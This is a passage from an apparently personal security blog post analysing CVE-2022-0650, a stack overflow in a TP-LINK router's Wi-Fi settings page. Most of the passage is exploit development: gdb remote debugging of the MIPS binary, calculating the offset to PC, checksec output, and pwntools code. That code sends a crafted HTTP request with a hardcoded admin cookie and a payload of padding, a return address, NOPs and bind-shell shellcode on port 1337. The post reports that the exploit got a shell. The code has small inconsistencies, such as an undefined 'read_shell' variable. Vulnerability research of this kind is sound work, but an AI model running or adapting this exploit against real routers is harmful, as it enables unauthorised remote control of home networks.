<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo gdb-multiarch <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;set architecture mips&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;set endian big&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;set follow-fork-mode parent&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;set detach-on-fork on&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;set auto-solib-add off&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;set solib-absolute-prefix /&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;break strncpy&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-ex <span class="s2">&#34;target extended-remote 192.168.0.1:1234&#34;</span></span></span></code></pre></div></div>
<h3 id="overwriting-pc">Overwriting PC</h3>
<p>Now Sending a slightly large payload of &ldquo;A&rdquo; into that parameter</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/CVE-2022-0650/5.png"
        data-srcset="/assets/images/CVE-2022-0650/5.png, /assets/images/CVE-2022-0650/5.png 1.5x, /assets/images/CVE-2022-0650/5.png 2x"
        data-sizes="auto"
        alt="/assets/images/CVE-2022-0650/5.png"
        title="img" /></p>
<p>in GDB we can find the PC has been overwritten successfully</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/CVE-2022-0650/4.png"
        data-srcset="/assets/images/CVE-2022-0650/4.png, /assets/images/CVE-2022-0650/4.png 1.5x, /assets/images/CVE-2022-0650/4.png 2x"
        data-sizes="auto"
        alt="/assets/images/CVE-2022-0650/4.png"
        title="img" /></p>
<p>Now to get the offset will generate a pattern with <code>cyclic</code> and check its offset</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; cyclic -l 0x72616162
</span></span><span class="line"><span class="cl">Finding cyclic pattern of <span class="m">4</span> bytes: b<span class="s1">&#39;raab&#39;</span> <span class="o">(</span>hex: 0x72616162<span class="o">)</span>
</span></span><span class="line"><span class="cl">Found at offset <span class="m">168</span></span></span></code></pre></div></div>
<h3 id="stack-analysis">Stack Analysis</h3>
<p>Now Sending the payload <code>&quot;A&quot;*168+&quot;BBBB&quot;+&quot;C&quot;*128+&quot;DDDD&quot;</code> to confirm we control <code>PC</code> and check where rest of input is placed on stack.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/CVE-2022-0650/6.png"
        data-srcset="/assets/images/CVE-2022-0650/6.png, /assets/images/CVE-2022-0650/6.png 1.5x, /assets/images/CVE-2022-0650/6.png 2x"
        data-sizes="auto"
        alt="/assets/images/CVE-2022-0650/6.png"
        title="img" /></p>
<p>we can confirm that we can control <code>PC</code> , also rest of payload is placed on stack and <code>SP</code> is pointing to it !</p>
<p>Checking <code>NX</code> on The binary to check if stack is exectuable , and it is</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; checksec
</span></span><span class="line"><span class="cl">File:     /tmp/tmpppjkpr27/tmp3fys92c7
</span></span><span class="line"><span class="cl">Arch:     mips
</span></span><span class="line"><span class="cl">RELRO:      No RELRO
</span></span><span class="line"><span class="cl">Stack:      No canary found
</span></span><span class="line"><span class="cl">NX:         NX unknown - GNU_STACK missing
</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</span></span><span class="line"><span class="cl">Stack:      Executable
</span></span><span class="line"><span class="cl">RWX:        Has RWX segments</span></span></code></pre></div></div>
<p>Our Payload Now Should be <code>&quot;A&quot;*offset+RIP+Nops+shellcode</code> , RIP should be the <code>SP</code> value so when execution reaches that it will execute the stack. as we disabled ASLR we can use the <code>SP</code> address <code>0x7dbffba0</code> as our new RIP in our payload.</p>
<h2 id="poc-for-a-shell">POC For a Shell</h2>
<p>As we are going to use pwntools and make TCP Connection , we need to use construct the HTTP Request OurSelves.</p>
<p>Example :</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-python">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">update_wifi_config</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://192.168.0.1/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">/userRpm/WlanNetworkRpm.htm&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;ssid1&#34;</span><span class="p">:</span> <span class="s2">&#34;TP-LINK_B324_t&#34;</span><span class="p">,</span> <span class="s2">&#34;ssid2&#34;</span><span class="p">:</span> <span class="s2">&#34;TP-LINK_B324_2AAAAA&#34;</span><span class="p">,</span> <span class="s2">&#34;ssid3&#34;</span><span class="p">:</span> <span class="s2">&#34;TP-LINK_B324_3&#34;</span><span class="p">,</span><span class="s2">&#34;ssid4&#34;</span><span class="p">:</span> <span class="s2">&#34;TP-LINK_B324_4&#34;</span><span class="p">,</span> <span class="s2">&#34;region&#34;</span><span class="p">:</span> <span class="s2">&#34;101&#34;</span><span class="p">,</span> <span class="s2">&#34;band&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;mode&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span> <span class="p">,</span><span class="s2">&#34;chanWidth&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span><span class="s2">&#34;channel&#34;</span><span class="p">:</span> <span class="s2">&#34;15&#34;</span><span class="p">,</span><span class="s2">&#34;ap&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;broadcast&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span><span class="s2">&#34;brlssid&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;brlbssid&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;addrType&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;keytype&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;wepindex&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;authtype&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;keytext&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;newBridgessid&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span><span class="s2">&#34;Save&#34;</span><span class="p">:</span> <span class="s2">&#34;Save&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">query_string</span> <span class="o">=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">/userRpm/WlanNetworkRpm.htm?</span><span class="si">{</span><span class="n">query_string</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Host&#34;</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="s2">&#34;Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">/userRpm/MenuRpm.htm&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">request_lines</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&#34;GET </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> HTTP/1.1&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">headers</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">request_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw_request</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">request_lines</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">raw_request</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&lt;/html&gt;&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div></div>
<p>Now to generate the shellcode , we will use the <code>shellcraft</code> from the pwntools and choose bind shell type , we also need to not use the badchars while generation such as null byte and new lines.</p>
<p>So the payload is overflowing until <code>PC</code> , Using RSP address and some NOPs and Finally the shellcode.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-python">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.0.1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">nop</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;addiu $a0, $a0, 0x4141&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">ra_addr</span> <span class="o">=</span> <span class="mh">0x7dbffba0</span> 
</span></span><span class="line"><span class="cl"><span class="n">avoid</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x0a\x0d</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">bindsh</span><span class="p">(</span><span class="mi">1337</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">all</span><span class="p">(</span><span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">avoid</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">read_shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">168</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ra_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">nop</span> <span class="o">*</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shell</span></span></span></code></pre></div></div>
<p>Running the exploit , we successfuly got a shell</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/CVE-2022-0650/7.png"
        data-srcset="/assets/images/CVE-2022-0650/7.png, /assets/images/CVE-2022-0650/7.png 1.5x, /assets/images/CVE-2022-0650/7.png 2x"
        data-sizes="auto"
        alt="/assets/images/CVE-2022-0650/7.png"
        title="img" /></p>
<p>Check Full POC Online <a href="https://github.com/HussienMisbah/Exploits/blob/master/CVE-2022-0650.py" target="_blank" rel="noopener noreffer ">here</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2025-09-30</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="https://hussienmisbah.github.io/posts/exploitation/2025-10-01-cve-2022-0650-analysis/" data-title="CVE-2022-0650 Analysis &amp; POC" data-via="tinkerhell1337" data-hashtags="CVE,Firmware-Analysis,Exploitation"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/exploitation/2025-10-01-cve-2022-0650-analysis/" data-hashtag="CVE"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://hussienmisbah.github.io/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fhussienmisbah.github.io%2fposts%2fexploitation%2f2025-10-01-cve-2022-0650-analysis%2f&amp;text=CVE-2022-0650%20Analysis%20%26%20POC" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cve/">CVE</a>,&nbsp;<a href="/tags/firmware-analysis/">Firmware-Analysis</a>,&nbsp;<a href="/tags/exploitation/">Exploitation</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" class="prev" rel="prev" title="EGCERT-CTF JDBCLeak Exploit"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>EGCERT-CTF JDBCLeak Exploit</a></div>
</div>
</article></div>
            </main></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
</html>
